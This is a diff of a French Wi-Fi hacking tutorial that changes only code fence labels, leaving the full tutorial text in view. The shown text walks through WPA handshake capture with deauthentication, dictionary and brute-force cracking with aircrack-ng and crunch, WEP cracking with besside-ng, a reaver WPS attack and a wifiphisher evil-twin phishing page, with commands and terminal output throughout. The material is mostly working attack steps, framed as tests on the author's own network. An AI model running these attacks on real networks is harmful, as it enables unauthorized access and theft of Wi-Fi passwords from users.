@@ -26,11 +26,11 @@ Par ailleurs, la VM doit être configurée en mode USB 3.0.*
 
 ### 1.1 - Passage en mode moniteur de la carte réseau
 Il faut s'assurer qu'elle soit bien connectée, elle devrait s'appeler `wlan0` :
-```shell
+```bash
 /sbin/ifconfig
 ```
 Le résultat est alors :
-```shell
+```bash
 wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
         ether ha:ck:er:mm:aa:nn  txqueuelen 1000  (Ethernet)
         RX packets 0  bytes 0 (0.0 B)
@@ -41,22 +41,22 @@ wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
 
 Il faut tuer les processus qui utilisent la carte réseau et empêcheraient le démarrage en mode moniteur.
 Pour ce faire, lancer la commande :
-```shell
+```bash
 sudo airmon-ng check kill
 ```
 Le résultat sera alors :
-```shell
+```bash
 PID Name
 2161 wpa_supplicant
 ```
 
 La commande suivante permet de passer la carte en mode moniteur :
-```shell
+```bash
 sudo airmon-ng start wlan0
 ```
 
 Le résultat est alors le suivant :
-```shell
+```bash
 PHY     Interface       Driver          Chipset
 phy0    wlan0           ath9k_htc       Qualcomm Atheros Communications AR9271 802.11n
 
@@ -66,13 +66,13 @@ phy0    wlan0           ath9k_htc       Qualcomm Atheros Communications AR9271 8
 
 ### 1.2 - Récupération des paquets d'initialisation de connexion (Handshake)
 C'est ici que commence la partie la plus intéressant. Via la commande suivante, le mode d'écoute va être lancé à l'aide de l'utilisateur `airodump-ng` :
-```shell
+```bash
 sudo airodump-ng wlan0mon
 ```
 
 Les réseaux voisins (BSSID) vont alors apparaître ainsi que tous les clients (périphériques) connectés. Dans cet article, le réseau `HACK-MOI-SI-TU-PEUX` va être piraté.
 
-```shell
+```bash
 CH 13 ][ Elapsed: 2 mins ][ 2020-11-22 12:40
 
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID  
@@ -86,12 +86,12 @@ VV:II:CC:TT:IM:EE  UT:IL:IS:AT:EU:RR  -55    0e- 0e     0       33
 Cette commande donne une vue d'ensemble des réseaux disponibles ainsi que tous les clients qui émettent des paquets (qu'ils soient associés à un BSSID ou non).
 La commande suivante va permettre de se "concentrer" sur un seul BSSID et ainsi **écouter tous les paquets à sa destination pour enregistrer les fichiers d'initialisation de connexion (Handshake)**. Un canal de wifi doit être défini ainsi que le BSSID a écouter :
 
-```shell
+```bash
 sudo airodump-ng -c 11 --bssid VV:II:CC:TT:IM:EE -w output wlan0mon
 ```
 
 Pour l'instant, aucune capture d'initialisation de connexion n'a été effectuée.
-```shell
+```bash
 CH 11 ][ Elapsed: 54 s ][ 2020-11-22 12:43
 
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                   
@@ -103,18 +103,18 @@ VV:II:CC:TT:IM:EE  UT:IL:IS:AT:EU:RR  -57    0e- 0      0      374
 ```
 
 Sur un autre terminal toujours en écoutant le BSSID cible, un paquet de désauthentification doit être envoyé grâce à l'utilitaire `aireplay-ng` en spécifiant le BSSID cible et l'adresse MAC du client cible :
-```shell
+```bash
 sudo aireplay-ng -0 1 -a VV:II:CC:TT:IM:EE -c UT:IL:IS:AT:EU:RR wlan0mon
 ```
 Le résultat est le suivant :
-```shell
+```bash
 12:52:38  Waiting for beacon frame (BSSID: VV:II:CC:TT:IM:EE) on channel 11
 12:52:39  Sending 64 directed DeAuth (code 7). STMAC: [UT:IL:IS:AT:EU:RR] [10|63 ACKs]
 ```
 
 Dans le terminal où l'écoute du BSSID cible est active, le paquet d'initialisation est alors récupéré, représenté par la valeur `WPA handshake: VV:II:CC:TT:IM:EE` :
 
-```shell
+```bash
 CH 11 ][ Elapsed: 1 min ][ 2020-11-22 12:53 ][ WPA handshake: VV:II:CC:TT:IM:EE
 
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID  
@@ -131,7 +131,7 @@ L'objectif est maintenant de casser le mot de passe présent ce fichier `.cap` g
 
 #### 1.3.1 - Cassage de la clé grâce à une génération de mots de passe
 L'outil crunch est un générateur de mot de passe aléatoire, il prend en paramètre une longueur de mot de passe et les caractères de ce dernier et génère toutes les possibilités. Dans cet exemple, un mot de passe de 8 à 25 caractères sera généré et contiendra uniquement les valeurs de l'alphabet. Chaque mot de passe généré est passé via le pipe à `aircrack-ng` :
-```shell
+```bash
 crunch 8 25 abcdefghijklmnopqrstuvwxy | aircrack-ng -w - -b VV:II:CC:TT:IM:EE *.cap
 ```
 Il n'y a qu'à attendre que le **mot de passe du wifi soit cracké**. Cependant, cette méthode n'est pas la plus efficace et la méthode suivante à beaucoup plus de chances de fonctionner.
@@ -140,12 +140,12 @@ Il n'y a qu'à attendre que le **mot de passe du wifi soit cracké**. Cependant,
 L'utilitaire `aircrack-ng` peut prendre en paramètre une liste de mots de passe. Le [dépôt GitHub SecList](https://github.com/danielmiessler/SecLists/blob/master/Passwords/richelieu-french-top20000.txt) en réuni un nombre conséquent et s'avère très utile dans ce cas. En effet, le point d'accès à pirater étant français dans ce cas, le "top" 20 000 des mots de passe français sera utilisé.
 
 La commande est donc la suivante :
-```shell
+```bash
 aircrack-ng -w richelieu-french-top20000.txt -b VV:II:CC:TT:IM:EE *.cap
 ```
 
 Le fichier `.cap` est alors correctement cassé et le mot de passe en clair est visible, dans ce cas `jetaime` :
-```shell
+```bash
 Aircrack-ng 1.6
 
 [00:00:00] 57/59 keys tested (452.32 k/s)
@@ -189,11 +189,11 @@ Selon [Wikipédia](https://fr.wikipedia.org/wiki/Wired_Equivalent_Privacy) :
 Voici comment **exploiter la vulnérabilité liée au protocole WEP pour pirater ce réseau sécurisé**.
 ### 2.1 - Passage en mode moniteur de la carte réseau
 Il faut s'assurer que la carte soit bien connectée, elle devrait s'appeler `wlan0` :
-```shell
+```bash
 /sbin/ifconfig
 ```
 Le résultat est alors :
-```shell
+```bash
 wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
         ether ha:ck:er:mm:aa:nn  txqueuelen 1000  (Ethernet)
         RX packets 0  bytes 0 (0.0 B)
@@ -204,22 +204,22 @@ wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
 
 Il faut tuer les processus qui utilisent la carte réseau et empêcheraient le démarrage en mode moniteur :
 Pour ce faire, lancer la commande :
-```shell
+```bash
 sudo airmon-ng check kill
 ```
 Le résultat sera alors :
-```shell
+```bash
 PID Name
 2161 wpa_supplicant
 ```
 
 La commande suivante permet de passer la carte en mode moniteur :
-```shell
+```bash
 sudo airmon-ng start wlan0
 ```
 
 Le résultat est alors le suivant :
-```shell
+```bash
 PHY     Interface       Driver          Chipset
 phy0    wlan0           ath9k_htc       Qualcomm Atheros Communications AR9271 802.11n
 (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
@@ -227,12 +227,12 @@ phy0    wlan0           ath9k_htc       Qualcomm Atheros Communications AR9271 8
 ```
 
 Une fois votre périphérique en mode écoute, il convient d'analyser les points d'accès qui utilisent le protocole WEP. Un filtre à la commande `airodump-ng` peut-être ajouté pour n'afficher que les point d'accès WEP.
-```shell
+```bash
 sudo airodump-ng wlan0mon --encrypt WEP
 ```
 Le résultat est alors le suivant :
 
-```shell
+```bash
 CH 13 ][ Elapsed: 2 mins ][ 2020-11-22 12:40
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID  
 VV:II:CC:TT:IM:EE  -56       84       40    0  11  195   WEP WEP   PSK  HACK-MOI-SI-TU-PEUX
@@ -247,7 +247,7 @@ Le BSSID est affiché dans la liste des points d'accès et le canal correspond a
 Dans ce cas, la commande sera `besside-ng -b VV:II:CC:TT:IM:EE -c 11 wlan0mon`.
 
 Le résultat sera alors :
-```shell
+```bash
 [18:39:34] Let's ride
 [18:39:34] Appending to wpa.cap
 [18:39:34] Appending to wep.cap
@@ -260,7 +260,7 @@ Le résultat sera alors :
 ```
 La commande doit alors être la suivante pour cracker les fichiers .cap : `sudo aircrack-ng ./wep.cap`
 Le résultat est alors le suivant :
-```shell
+```bash
 Aircrack-ng 1.6
 [00:00:00] 17876 keys tested (got 20212 IVs)
 KEY FOUND! [ jetaime ]
@@ -297,7 +297,7 @@ Il n'y a aucun moyen de sécuriser un point d'accès sécurisé par le protocle 
 PixieDust est une vulnérablité découverte dans la fonctionnalité WPS. Cette vulnérabilité permet d'augmenter de manière significative la vitesse d'attaque par force brute du code PIN WPS.
 Tout comme les autres chapitres, l'objectif de la première commande `sudo airodump-ng wlan0mon --wps` est de lancer une écoute du réseau et d'afficher les point d'accès dont le WPS est activé et déverrouillé.
 Le résultat est alors le suivant et la version de WPS est visible :
-```shell
+```bash
 CH 13 ][ Elapsed: 30 s ][ 2020-11-28 17:49
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS          ESSID
 VV:II:CC:TT:II:ME  -60       11      142   11   1  130   WPA2 CCMP   PSK  1.0 LAB,PBC  HACK-MOI-SI-TU-PEUX
@@ -308,7 +308,7 @@ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probe
 
 Il est alors possible de lancer l'attaque avec l'outil [reaver](https://tools.kali.org/wireless-attacks/reaver) qui implémente l'attaque PixieDust avec l'argument `-K` mais peut également faire du brute force classique.
 La commande pour lancer l'attaque est la suivante :
-```shell
+```bash
 reaver -i wlan0mon -b VV:II:CC:TT:II:ME -v
 ```
 Mon réseau de test n'était pas vulnérable, il ne m'a pas été possible d'exécuter correctement cette attaque.
@@ -321,11 +321,11 @@ Il n'y a aucun moyen de sécuriser un point d'accès dont le WPS est activé. [L
 Cette méthode est différente des trois autres méthodes présentées plus haut. En effet, il ne s'agit pas de casser un mot de passe ici, mais d'utiliser une **attaque de type phishing (Evil Twin)**. Le but est de générer un réseau qui a le même nom que le réseau cible mais qui lui sera ouvert (sans mot de passe). Une fois que le client se connectera à ce dernier, une fausse page sera générée pour faire office de page d'authentification. Les informations entrées seront alors transmises à l'attaquant. Les clients légitimement connectés au vrai réseau se verront déconnectés du réseau légitime par l'attaquant grâce à l'envoi de paquets de désauthentification.
 
 Le framework [wifiphisher](https://github.com/wifiphisher/wifiphisher) sera utilisé car il est très complet et fait toutes ces opérations de manière automatique. Une fois installé, il suffit de le lancer avec la commande :
-```shell
+```bash
 sudo wifiphisher
 ```
 Il faut ensuite sélectionner un point d'accès à cloner :
-```shell
+```bash
 Options:  [Esc] Quit  [Up Arrow] Move Up  [Down Arrow] Move Down
 ESSID                          BSSID            CH  PWR  ENCR      CLIENTS VENDOR      
 ┌─────────────────────────────────────────────────────────────────────────────────────┐  
@@ -336,7 +336,7 @@ ESSID                          BSSID            CH  PWR  ENCR      CLIENTS VENDO
 
 Le choix se fait avec les touches directionnelles :
 
-```shell
+```bash
 Options: [Up Arrow] Move Up  [Down Arrow] Move Down
 
 Available Phishing Scenarios:                                                                                  
@@ -357,7 +357,7 @@ L'option choisie ici est `Firmware Upgrade Page`. Le réseau est automatiquement
 
 Voici le résulat lorsqu'une victime entre un mot de passe. Toutes les requêtes apparaissent en clair du côté de l'attaquant et le mot de passe aussi : `wfphshr-wpa-password=jetaime`:
 
-```shell
+```bash
 Extensions feed:                    | wifiphisher 1.4GIT          
 DEAUTH/DISAS - UT:IL:IS:AT:EU:R1    | ESSID: HACK-MOI-SI-TU-PEUX       
 DEAUTH/DISAS - UT:IL:IS:AT:EU:R2    | Channel: 6                  
